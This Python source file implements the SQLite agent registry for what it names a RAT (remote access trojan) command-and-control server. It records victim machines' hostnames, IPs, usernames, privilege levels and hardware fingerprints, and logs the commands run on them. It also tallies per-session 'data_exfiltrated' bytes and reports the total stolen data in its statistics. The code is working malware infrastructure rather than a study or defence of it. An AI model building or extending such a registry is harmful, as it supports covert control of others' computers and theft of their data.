"""
═══════════════════════════════════════════════════════════════════════════
CENTRAL AGENT REGISTRY
Persistent agent session management with SQLite
═══════════════════════════════════════════════════════════════════════════
"""

import sqlite3
import threading
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pathlib import Path
import hashlib
import uuid

class AgentRegistry:
    """Manage agent registrations and sessions"""
    
    def __init__(self, db_path: str = "data/rat_sessions.db"):
        """Initialize agent registry with database"""
        self.db_path = Path(db_path)
        self.lock = threading.RLock()
        
        # Create database path
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Initialize database
        self._init_database()
    
    def _init_database(self):
        """Create database schema if not exists"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            # Agents table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS agents (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT UNIQUE NOT NULL,
                    hostname TEXT NOT NULL,
                    os TEXT NOT NULL,
                    os_version TEXT,
                    ip_address TEXT NOT NULL,
                    port INTEGER,
                    username TEXT,
                    user_id TEXT,
                    domain TEXT,
                    privilege_level TEXT,
                    
                    -- Hardware info
                    cpu_cores INTEGER,
                    total_ram INTEGER,
                    machine_guid TEXT UNIQUE,
                    
                    -- Timestamps
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_activity TIMESTAMP,
                    
                    -- Status
                    status TEXT DEFAULT 'offline',  -- offline, online, lost
                    is_active BOOLEAN DEFAULT 1,
                    
                    -- Metadata
                    metadata TEXT,  -- JSON
                    
                    UNIQUE(hostname, machine_guid)
                )
            ''')
            
            # Sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    agent_id TEXT NOT NULL,
                    session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    session_end TIMESTAMP,
                    last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connection_count INTEGER DEFAULT 1,
                    commands_executed INTEGER DEFAULT 0,
                    data_exfiltrated INTEGER DEFAULT 0,  -- bytes
                    status TEXT DEFAULT 'active',
                    
                    FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
                )
            ''')
            
            # Fingerprints table (prevent re-registration)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS fingerprints (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT UNIQUE NOT NULL,
                    hardware_id TEXT UNIQUE,
                    machine_guid TEXT,
                    processor_id TEXT,
                    bios_serial TEXT,
                    volume_serial TEXT,
                    fingerprint_hash TEXT UNIQUE NOT NULL,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    
                    FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
                )
            ''')
            
            # Command history table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    agent_id TEXT NOT NULL,
                    command TEXT NOT NULL,
                    executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    completed_at TIMESTAMP,
                    status TEXT DEFAULT 'pending',  -- pending, success, failed
                    result TEXT,
                    
                    FOREIGN KEY(session_id) REFERENCES sessions(session_id),
                    FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
                )
            ''')
            
            # Create indices for performance
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_agents_active ON agents(is_active)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_agent ON sessions(agent_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_id)')
            
            conn.commit()
    
    def register_agent(self, hostname: str, os: str, ip: str, 
                      machine_guid: str, metadata: Dict = None) -> str:
        """Register new agent, returns agent_id"""
        with self.lock:
            agent_id = str(uuid.uuid4())
            
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                
                try:
                    cursor.execute('''
                        INSERT INTO agents 
                        (agent_id, hostname, os, ip_address, machine_guid, metadata, last_activity, status)
                        VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 'online')
                    ''', (agent_id, hostname, os, ip, machine_guid, 
                          json.dumps(metadata or {})))
                    
                    conn.commit()
                    return agent_id
                
                except sqlite3.IntegrityError:
                    # Agent already exists with this GUID
                    cursor.execute('''
                        SELECT agent_id FROM agents WHERE machine_guid = ?
                    ''', (machine_guid,))
                    result = cursor.fetchone()
                    return result[0] if result else None
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        """Get agent info by ID"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT * FROM agents WHERE agent_id = ?
            ''', (agent_id,))
            
            row = cursor.fetchone()
            if row:
                agent = dict(row)
                if agent['metadata']:
                    agent['metadata'] = json.loads(agent['metadata'])
                return agent
            return None
    
    def list_agents(self, status: str = None, active_only: bool = True) -> List[Dict]:
        """List all agents, optionally filtered"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            query = 'SELECT * FROM agents WHERE 1=1'
            params = []
            
            if active_only:
                query += ' AND is_active = 1'
            
            if status:
                query += ' AND status = ?'
                params.append(status)
            
            query += ' ORDER BY last_activity DESC'
            
            cursor.execute(query, params)
            
            agents = []
            for row in cursor.fetchall():
                agent = dict(row)
                if agent['metadata']:
                    agent['metadata'] = json.loads(agent['metadata'])
                agents.append(agent)
            
            return agents
    
    def update_last_activity(self, agent_id: str):
        """Update last activity timestamp"""
        with self.lock:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE agents SET last_activity = CURRENT_TIMESTAMP 
                    WHERE agent_id = ?
                ''', (agent_id,))
                conn.commit()
    
    def create_session(self, agent_id: str) -> str:
        """Create new session for agent"""
        with self.lock:
            session_id = str(uuid.uuid4())
            
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                
                cursor.execute('''
                    INSERT INTO sessions (session_id, agent_id, last_heartbeat)
                    VALUES (?, ?, CURRENT_TIMESTAMP)
                ''', (session_id, agent_id))
                
                conn.commit()
                return session_id
    
    def get_session(self, session_id: str) -> Optional[Dict]:
        """Get session info"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT * FROM sessions WHERE session_id = ?
            ''', (session_id,))
            
            row = cursor.fetchone()
            return dict(row) if row else None
    
    def update_heartbeat(self, session_id: str):
        """Update session heartbeat"""
        with self.lock:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE sessions SET last_heartbeat = CURRENT_TIMESTAMP
                    WHERE session_id = ?
                ''', (session_id,))
                conn.commit()
    
    def log_command(self, session_id: str, agent_id: str, command: str) -> int:
        """Log command execution"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO commands (session_id, agent_id, command)
                VALUES (?, ?, ?)
            ''', (session_id, agent_id, command))
            conn.commit()
            return cursor.lastrowid
    
    def update_command(self, command_id: int, status: str, result: str = None):
        """Update command result"""
        with self.lock:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE commands 
                    SET status = ?, result = ?, completed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (status, result, command_id))
                conn.commit()
    
    def get_statistics(self) -> Dict:
        """Get registry statistics"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            cursor.execute('SELECT COUNT(*) FROM agents WHERE is_active = 1')
            active_agents = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM agents WHERE status = "online"')
            online_agents = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM sessions WHERE status = "active"')
            active_sessions = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "success"')
            successful_commands = cursor.fetchone()[0]
            
            cursor.execute('SELECT SUM(data_exfiltrated) FROM sessions WHERE data_exfiltrated > 0')
            total_data = cursor.fetchone()[0] or 0
            
            return {
                'total_agents': active_agents,
                'online_agents': online_agents,
                'active_sessions': active_sessions,
                'successful_commands': successful_commands,
                'total_data_exfiltrated': total_data,
            }
    
    def cleanup_old_sessions(self, days: int = 30):
        """Remove old inactive sessions"""
        with self.lock:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    DELETE FROM sessions 
                    WHERE status = 'inactive' 
                    AND session_end < datetime('now', '-' || ? || ' days')
                ''', (days,))
                conn.commit()


if __name__ == '__main__':
    # Test the registry
    registry = AgentRegistry()
    
    # Register a test agent
    agent_id = registry.register_agent(
        hostname='TEST-PC',
        os='Windows 10',
        ip='192.168.1.100',
        machine_guid='GUID-12345',
        metadata={'version': '1.0'}
    )
    
    print(f"✅ Registered agent: {agent_id}")
    
    # Get agent
    agent = registry.get_agent(agent_id)
    print(f"✅ Agent info: {agent['hostname']}")
    
    # List agents
    agents = registry.list_agents()
    print(f"✅ Total agents: {len(agents)}")
    
    # Get statistics
    stats = registry.get_statistics()
    print(f"✅ Statistics: {stats}")
